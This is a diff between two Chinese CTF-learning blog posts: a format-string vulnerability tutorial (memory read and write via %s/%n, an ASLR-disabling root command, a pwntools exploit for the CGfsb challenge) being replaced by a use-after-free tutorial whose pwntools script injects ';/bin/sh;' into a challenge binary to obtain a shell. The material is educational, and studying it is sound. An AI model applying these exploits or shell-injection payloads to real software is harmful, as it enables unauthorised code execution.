@@ -1,16 +1,7 @@
 <!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="格式化字符串漏洞, Du4t~~~~">
-    <meta name="description" content="
-漏洞成因对于正常且安全的使用==printf函数==是这样操作的
-#include 
-
-int main(void)
-{
-    int n=5;
-    printf("%d",n);
-    return 0;
-}但是偏偏有些懒人喜欢">
+    <meta name="keywords" content="UAF漏洞生成原理及利用, Du4t~~~~">
+    <meta name="description" content="UAF漏洞生成原因UAF漏洞全称为Use After Free 从字面意思上都能理解是在程序Free掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +9,7 @@ int main(void)
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>格式化字符串漏洞 | Du4t的博客</title>
+    <title>UAF漏洞生成原理及利用 | Du4t的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,13 +300,13 @@ int main(void)
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        格式化字符串漏洞
+                        UAF漏洞生成原理及利用
                     </div>
                 </div>
             </div>
@@ -451,21 +442,21 @@ int main(void)
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:  
-                    2019-10-08
+                    2019-12-15
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="far fa-file-word fa-fw"></i>文章字数:  
-                        1.9k
+                        1.8k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="far fa-clock fa-fw"></i>阅读时长:  
-                        7 分
+                        6 分
                     </div>
                     
                 
@@ -481,155 +472,74 @@ int main(void)
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><a id="more"></a>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>对于正常且安全的使用==printf函数==是这样操作的</p>
-<pre><code>#include <stdio.h>
+                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="UAF漏洞生成原因"><a href="#UAF漏洞生成原因" class="headerlink" title="UAF漏洞生成原因"></a>UAF漏洞生成原因</h2><p>UAF漏洞全称为<code>Use After Free</code> 从字面意思上都能理解是在程序<code>Free</code>掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除逻辑方面的漏洞 讲解一下原理层面<code>UAF漏洞</code>是怎么造成的 以及造成的原理是什么</p>
+<p>首先我们需要明确一点 应用程序在调用<code>free()</code>函数来释放一个内存块的时候 如果内存块的大小是小于256kb的时候 dlmalloc(一种内存分配器 相当于管理员)并不会立即就将内存块释放回内存 而是将内存块标记为空闲状态备用 这样做的主要目的有两种 其一是因为此时的内存块并不是位于堆的顶端 导致内存块并不能马上释放回内核 其二是为了以防程序下一次重新申请内存块的时候还要去内存中重新申请 这块内存会留下来备用 等到程序再次申请时 直接将此内存块分配给程序 提高程序执行速度</p>
+<p>当然 dlmalloc肯定不会允许程序内部空闲的内存块无限堆积 当程序内部空闲的内存块达到256kb时 dlmalloc会立即调用<code>munmap()</code>释放内存 即dlmalloc堆积内存块的最高上限为256kb 当程序申请256kb以上的内存块时 dlmalloc会调用<code>mmap()</code>向内核重新申请256kb的内存块 而不会使用堆积空闲的内存块</p>
+<p>从程序开发和执行的角度来讲 这样的机制其实并没有什么问题 毕竟这样的机制是可以提升程序的执行效率的 而且并没有什么明显的缺陷</p>
+<p>但是一旦编程者在逻辑层面上把控不到位 <strong>在程序执行<code>free()</code>释放内存之后 没有很好的管控已经释放过的内存块 导致此内存块在程序中依然能够进行访问 就会造成UAF漏洞</strong> 例如在<code>free()</code>函数之后 没有结束程序 在继续运行的过程中 依然有指针对该内存块进行读写操作等 </p>
+<p>所以从严格意义上讲 UAF漏洞不是”天灾”而是”人祸”</p>
+<h2 id="UAF漏洞的验证"><a href="#UAF漏洞的验证" class="headerlink" title="UAF漏洞的验证"></a>UAF漏洞的验证</h2><blockquote>
+<p>此模块测试样例1</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><string.h></span></span>
 
-int main(void)
-{
-    int n=5;
-    printf("%d",n);
-    return 0;
-}</stdio.h></code></pre><p>但是偏偏有些懒人喜欢偷懒 少打两个字写成这样子</p>
-<pre><code>#include <stdio.h>
-
-int main(void)
-{
-    char a[]="qwerdf";
-    printf(a);
-    return 0;
-}</stdio.h></code></pre><p>对于printf函数来说 它的函数原型是</p>
-<blockquote>
-<p>printf(“格式化字符串”,参量1,参量2….)<br>如果输出成功返回输出的字数 如果输出失败则返回负数<br>格式化字符串 可以是以’%’开头的后跟特定字符来确定输出样式的 也可以是正常的字符串</p>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+   <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
+   p1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%p,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
+   p2<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"world"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%p,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>使用GCC编译时无需关闭任何保护 直接编译即可</p>
 </blockquote>
-<p>但是由于函数调用的关系 实参和形参结合的顺序是从左向右结合的 所以函数这样写也是可以正常输出的<br><img src="https://img-blog.csdnimg.cn/20190923193449792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=" ">以上代码 本身没有什么问题 但是如果用户可以控制输入的话 就会造成一些意想不到的结果</p>
-<pre><code>#include <stdio.h>
-int main(void)
-{
-    char a[100];
-    scanf("%s",a);
-    printf(a);
-    return 0;
- } </stdio.h></code></pre><p><img src="https://img-blog.csdnimg.cn/20190923193909689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=" "><br>我们可以通过测试发现 程序输出了一些奇怪的输出 我们载入x32dbg查看下 程序到底输出的是什么<br>通过观察栈中 我们发现 其实程序输出的就是栈中的数据<br><img src="https://img-blog.csdnimg.cn/20190923195130178.png" alt><br>造成这种结果的原因是 因为我们输入的%x 在我们用不安全的方式调用printf函数的时候 没有明确表示出哪里的参数是空缺的 这就会造成系统自动从左往右进行匹配 我们输入的%x 又正好是在 “格式化字符串” 这个参数内 系统就会将他当成默认的%x来进行输出</p>
-<blockquote>
-<p>同样的 如果我们输入的是%s 且在内存地址上正好有个字符串 我们就可以将内存中的字符串输出出来</p>
+<p>这个模块是通过两个小例子来验证UAF漏洞原理的正确性 看看是否free掉内存块后 依旧对其读写会对后续分配的内存块有影响和在小于256kb的情况下 重新分配内存 是否依旧是之前free掉的内存</p>
+<p>简单解释下程序逻辑 刚开始程序会申请一个大小为10个字符型数据的内存块 然后向其内部输入<code>hello</code> 紧接着free掉此内存块 然后立刻重新申请同样大小的内存块 同时利用之前free后遗留下来的指针对之前free掉的内存块重新写入数据 然后打印数据</p>
+<p>那么我们运行程序观察下结果</p>
+<p><img src="http://115.159.222.69/tc/e6153263dc5bf272d679e57834257a30.png" alt></p>
+<p>不难发现 程序两次申请的内存块地址是一样的 而且使用遗留下来的指针对free掉的内存块进行写入数据 同样会影响到后续重新申请的内存块 由此可以发现 UAF漏洞原理是正确的且会对程序的正常运行造成巨大的安全隐患</p>
+<h2 id="UAF漏洞的利用"><a href="#UAF漏洞的利用" class="headerlink" title="UAF漏洞的利用"></a>UAF漏洞的利用</h2><blockquote>
+<p>这里我采用的是<code>攻防世界/PWN版块进阶区/time_formatter</code>这道题来演示漏洞的利用  </p>
 </blockquote>
-<p>通过这种方式 我们就可以做到栈数据泄露</p>
-<h2 id="内存读取"><a href="#内存读取" class="headerlink" title="内存读取"></a>内存读取</h2><blockquote>
-<p>在进行以下版块的实验前 请先关闭掉Linux系统的PIE(空间分布随机化) 不然会造成程序变量地址一直在变动<br> 可以在==root==权限下 使用以下命令关闭<br>echo 0 > /proc/sys/kernel/randomize_va_space</p>
-</blockquote>
-<p>首先我们需要明确一点 所有的局部变量都是在栈中存放着 所以如果我们能泄露出来某个字符串的地址 我们就有机会直接读取到内存中这个字符串的值 </p>
-<p>首先给出利用代码</p>
-<blockquote>
-<p>   关于如何写入地址的问题 菜鸡也不会在scanf的情况下写入地址 可能只有对照的ASCII码表进行输入了吧<br>所以在接下来的程序中 以命令行参数的形式向程序输入<br>因为 在命令行中 可以使用printf函数来将shellcode编码转换成字符</p>
-</blockquote>
-<pre><code>#include <stdio.h>
-#include <string.h>
-int main(int argc,char **argv)
-{
-    char a[100];
-    strcpy(a,argv[1]);
-    char flag[100]={"flag"};  
-    printf("%p\n",flag);
-    printf(a);
-    printf("\n");
-    return 0;
-}</string.h></stdio.h></code></pre><p>在这里我们是直接将flag数组的地址直接输出出来 相当于泄露了关键字符串的地址吧…<br>因为==所有的局部变量都是存放在栈中的== 首先第一步就是需要遍历栈中数据找到输入的数据 以达到后面控制输入变量的目的<br><img src="https://img-blog.csdnimg.cn/20190923212726366.png" alt>这里发现栈中数据的第九位正好就是我们输入的数据 为了方便查看 也可以使用以下方式来查看第n位的回显</p>
-<blockquote>
-<p>%< Number >$ formot string<br>注意此方法仅适用于Linux系统 且在命令行中使用需要转义$</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20190923213014599.png" alt><br>在这里就可以控制输入的参数 将输入改为flag字符串的地址 同时根据上面所提过的 将%08x更改为%s直接读取到flag字符串具体的值<br><img src="https://img-blog.csdnimg.cn/2019092321331572.png" alt><br>根据以上操作 如果条件允许的话 就可以做到任意内存读取</p>
-<h2 id="内存修改"><a href="#内存修改" class="headerlink" title="内存修改"></a>内存修改</h2><blockquote>
-<p>首先先介绍一种不常见的 格式说明符’%n’ 它的作用并不是像%c %d那样说明格式 而是将%n之前的字符个数赋值给一个变量</p>
-</blockquote>
-<p>这里先给出实验代码</p>
-<pre><code>#include <stdio.h>
-#include <string.h>
-int main(int argc,char **argv)
-{
-    char a[100];
-    static int b=0;
-    strcpy(a,argv[1]);
-    printf("The addr of b is %p\n",&b);
-    printf(a);
-    printf("\n");
-    printf("The value of b is %d\n",b);
-    return 0;
-}</string.h></stdio.h></code></pre><p>首先运行一次程序 可以得知静态变量b的地址 然后尝试查看回显位 这里我的回显位是第十位<br><img src="https://img-blog.csdnimg.cn/20190924181656618.png" alt>尝试在运行程序时 使用printf写入地址<br><img src="https://img-blog.csdnimg.cn/2019092418190293.png" alt><br>此时就可以使用之前介绍过的 格式说明符%n了 %n将他自身前字符的个数 赋值给地址为0x5655700c的静态变量b 以达到修改内存中值的目的<br><img src="https://img-blog.csdnimg.cn/2019092418215847.png" alt><br>同样的 如果我们想将b的值修改的更大 只需要在 ‘%10$n’ 前增加对应数量的0即可<br><img src="https://img-blog.csdnimg.cn/20190924182308483.png" alt></p>
-<h2 id="格式化字符串的应用"><a href="#格式化字符串的应用" class="headerlink" title="格式化字符串的应用"></a>格式化字符串的应用</h2><blockquote>
-<p>这里使用攻防世界 PWN模块的 CGfsb 作为例题</p>
-</blockquote>
-<p>首先载入IDA 通过阅读源码 发现关键判断 只要pwnme变量等于8 就能输出flag 同时发现程序崔仔格式化字符串漏洞 这里的条件和上面模块的条件类似<br><img src="https://img-blog.csdnimg.cn/20190924184328449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>双击pwnme变量 查看pwnme的具体地址 在得知了具体地址后 我们就可以开始写脚本了<br><img src="https://img-blog.csdnimg.cn/20190924184625528.png" alt></p>
-<blockquote>
-<p>这里需要介绍一款工具 pwntools 它是python的一个库 平时主要常用其中的模块有</p>
-<ul>
-<li>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台<ul>
-<li>dynelf : 用于远程符号泄漏，需要提供leak方法</li>
-<li>elf : 对elf文件进行操作</li>
-<li>gdb : 配合gdb进行调试</li>
-<li>memleak : 用于内存泄漏</li>
-<li>shellcraft : shellcode的生成器</li>
-<li>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</li>
-<li>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</li>
-</ul>
-</li>
-</ul>
-<p>其中比较关键的函数有</p>
-<ul>
-<li>连接</li>
-</ul>
-<pre><code>#本地连接 a=process("程序路径")
+<p>拿到程序查壳查保护这些起手式我就不多赘述了 程序的逻辑和做题步骤也与漏洞无关 这里直接暴露出漏洞点和漏洞细节</p>
+<p><img src="http://115.159.222.69/tc/108db783bd6be6a1b13d2271a31275d7.png" alt></p>
+<p>注意观察程序逻辑 不难发现程序在此函数内存在一个巨大的逻辑漏洞 即优先释放内存块 (为方便后续讲解 后文统称此块内存块为 内存块1) 再重新询问用户判断是否真的要退出 如果选择不退出程序继续运行 如果程序执行到该函数而选择不退出程序的话 整个程序内部调用的指针进行的读写 都是指向这块已被释放的内存空间 确定此处存在典型的UAF漏洞 </p>
+<p>继续阅读程序源码 发现在用户可正常到达的函数内 存在一个重新申请一个内存块2的操作 那么这个时候基本可以断定是从此处重新申请回原本的内存块1</p>
+<p><img src="http://115.159.222.69/tc/83b1d472b84c868266538cc3de96eec5.png" alt></p>
+<p><em>原本的程序函数名并不是这样 为了方便理解 我对函数名进行了重命名</em></p>
+<p>同时发现程序内部执行了<code>system</code>函数 此时的参数为内存块1的值 </p>
+<p><img src="http://115.159.222.69/tc/8c379b8be016e6439c84576fd4debf66.png" alt></p>
+<p>起初的想法是直接在内存块1初始化时 输入<code>'/bin/sh'</code>以达到GetShell的目的 但是发现在初始化内存块1时程序存在一个检测 不允许单引号的输入</p>
+<p><img src="http://115.159.222.69/tc/1d6330a9c6b361ed4c159f60db0e06fa.png" alt></p>
+<p>所以此时想要GetShell只有一个办法 即正常申请一个内存块1 然后释放掉内存块1 利用UAF漏洞的特性 申请到和内存块同地址的内存块2 然后修改内存块2的值 以达到修改内存块1值的目的(虽然已经被释放掉了 但是程序内的指针依旧指向此处) 然后调用system即可 </p>
+<p>脚本如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-#远程连接 a=remote("主机ip","端口号")
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./time'</span><span class="token punctuation">)</span>
 
-#关闭连接 a.close()</code></pre><ul>
-<li>IO</li>
-</ul>
-<pre><code>#发送数据 
-a.send("发送的数据")
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"aaaaa"</span><span class="token punctuation">)</span>
 
-#发送一行数据 相当于在数据后加个\n 
-a.sendline("发送的数据“)
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"N"</span><span class="token punctuation">)</span>
 
-#接受数据
-a.recv(numb=接受的字节数,timeout=指定超时时间)
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span>
 
-#接受一行数据 keepends为是否保留结尾的\n 
-a.recvline(keepends=?)
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"';/bin/sh;'"</span><span class="token punctuation">)</span>
 
-#接受数据直到我们设置的标志出现 
-a.recvuntil("标志数据")
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
 
-#一直接收数据 直到EOF 
-a.recvall()
-
-#持续接收直到EOF或者timeout 
-a.recvrepeat(timeout=default)
-
-#直接进行交互 相当于回到shell的模式 在取得sell之后使用 
-a.interactive()</code></pre><p>如果需要继续深入的学习可以参考大佬的博客 <a href="https://www.jianshu.com/p/355e4badab50" target="_blank" rel="noopener">https://www.jianshu.com/p/355e4badab50</a></p>
-</blockquote>
-<pre><code>from pwn import *
-
-#建立本地连接
-sh=process("./example")
-
-#设置标志接受
-sh.recvline("please tell me your name:")
-
-#回复程序以继续运行
-sh.send("AAAA")
-
-sh.recvline("leave your message please:")
-
-#设置pwnme的地址 这里的p32是将数据转为小端存储
-pwnme=p32(0x0804A068)
-
-#输出payload修改pwnme的值
-sh.send(pwnme+"0000%10$n")
-
-#程序持续运行
-sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img-blog.csdnimg.cn/20190924190754182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>至于为什么此处修改的值是<code>';/bin/sh;'</code> 这就涉及到命令注入的知识了 如果有机会我们下次再讲</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>UAF漏洞作为堆上最基础的漏洞 其地位和栈上格式化字符串漏洞一样 都是属于”人祸” 如果编程者在书写程序时 逻辑更加严密 是完全可以避免的 随着时代的进步 格式化字符串基本在非CTF比赛的场景里已经见不到了 但是作为C语言精髓的指针和堆 这上面的漏洞还是偶尔可以见到的 甚至UAF漏洞都是有可能存在的漏洞 所以细心审计代码 严格审查逻辑漏洞 起码对于UAF漏洞来说 是最好的 也是唯一的防御手段</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -806,8 +716,8 @@ sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img
                 </a>
             </div>
             <br>
-            <a href="/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/">
-                    《格式化字符串漏洞》
+            <a href="/2019/12/15/uaf/">
+                    《UAF漏洞生成原理及利用》
             </a> 由
             <a href="http://Du4t.github.io">
                 Du4t
@@ -850,50 +760,46 @@ sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i> 上一篇</div>
+                <i class="fas fa-chevron-left"></i> 本篇
+            </div>
             <div class="card">
-                <a href="/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/">
+                <a href="/2019/12/15/uaf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="攻防世界PWN新手练习区WP">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="UAF漏洞生成原理及利用">
                         
-                        <span class="card-title">攻防世界PWN新手练习区WP</span>
+                        <span class="card-title">UAF漏洞生成原理及利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-
-近期笨逼菜鸡开始接触PWN 刷了刷攻防世界的题目 在这里记录下自己的学习成果
-
-CGfsb首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息发现无壳 但是存在Canary保护和NX保护
-
-这里先讲一下什么是Canary保护Can
+                            UAF漏洞生成原因UAF漏洞全称为Use After Free 从字面意思上都能理解是在程序Free掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-10-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/WP/" class="post-category">
-                                    WP
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/WP/">
-                        <span class="chip bg-color">WP</span>
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
                     </a>
                     
                 </div>
@@ -907,47 +813,35 @@ CGfsb首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信�
                 下一篇 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/08/ni-xiang-chang-jian-de-suan-fa/">
+                <a href="/2019/12/08/kmp-suan-fa/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="逆向常见的算法">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="KMP算法">
                         
-                        <span class="card-title">逆向常见的算法</span>
+                        <span class="card-title">KMP算法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-
-Base64对于Base64来说 是我们通常比较常见的加密算法 通常是应用 动态页面开发 或者是流媒体路径加密上 对于我这样的
-菜鸡来说 通常常见于Web题中 但是在逆向题中也偶有见到Base64算法通俗的来讲就是 ==将3个8位字节转
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-08
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/RE/" class="post-category">
-                                    RE
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Du4t
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/RE/">
-                        <span class="chip bg-color">RE</span>
-                    </a>
-                    
                 </div>
                 
             </div>
